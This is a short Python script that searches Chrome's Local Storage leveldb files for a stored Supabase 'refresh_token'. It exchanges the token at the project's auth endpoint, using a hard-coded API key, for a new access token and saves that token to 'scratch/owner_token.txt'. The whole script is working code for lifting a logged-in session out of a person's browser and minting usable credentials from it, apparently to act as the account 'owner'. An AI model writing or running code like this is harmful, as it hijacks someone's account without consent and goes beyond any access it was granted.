import glob, os, re, json, urllib.request

files = glob.glob(os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\Local Storage\leveldb\*.ldb'))
files.extend(glob.glob(os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\Local Storage\leveldb\*.log')))
files.sort(key=os.path.getmtime, reverse=True)

refresh_token = None
for fpath in files:
    try:
        with open(fpath, 'rb') as f:
            content = f.read().decode('utf-8', errors='ignore')
            m = re.search(r'"refresh_token":\s*"([^"]+)"', content)
            if m:
                refresh_token = m.group(1)
                print('Found refresh token in:', os.path.basename(fpath))
                break
    except Exception:
        pass

if refresh_token:
    print('Refresh token found:', refresh_token[:15], '...')
    url = 'https://fsximdllrhglabxbqvay.supabase.co/auth/v1/token?grant_type=refresh_token'
    data = json.dumps({'refresh_token': refresh_token}).encode('utf-8')
    req = urllib.request.Request(url, data=data, headers={
        'apikey': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImZzeGltZGxscmhnbGFieGJxdmF5Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTY3NTg0NzgsImV4cCI6MjA3MjMzNDQ3OH0.KiRJdFoW4DtDAPMLqH9Im3-37GhIFmD269iDsY7ih2Q',
        'Content-Type': 'application/json'
    })
    try:
        with urllib.request.urlopen(req) as resp:
            tokens = json.loads(resp.read().decode('utf-8'))
            new_access_token = tokens.get('access_token')
            print('Successfully refreshed! New access token length:', len(new_access_token))
            with open('scratch/owner_token.txt', 'w') as out:
                out.write(new_access_token)
    except Exception as e:
        print('Refresh error:', e)
else:
    print('No refresh token found.')
